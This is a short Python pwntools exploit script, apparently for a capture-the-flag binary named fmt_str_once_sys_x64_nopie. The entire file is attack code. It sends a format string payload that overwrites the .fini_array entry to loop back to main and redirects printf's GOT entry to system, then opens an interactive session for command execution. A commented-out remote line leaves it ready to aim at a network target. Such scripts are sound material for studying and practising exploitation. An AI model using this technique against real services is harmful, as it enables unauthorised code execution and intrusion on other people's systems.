#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'amd64'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_once_sys_x64_nopie'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =elf.libc


dem = 'input:\n'
io.recvuntil(dem)
fini_array = 0x4031D0
main_adrr = elf.symbols["main"]
printf_got = elf.got["printf"]
system_plt = elf.symbols["system"]
duchao_pwn_script.dbg(io)
payload = fmtstr_payload(6, {fini_array :main_adrr , printf_got:system_plt})
print(payload)
io.send(payload)



io.interactive()
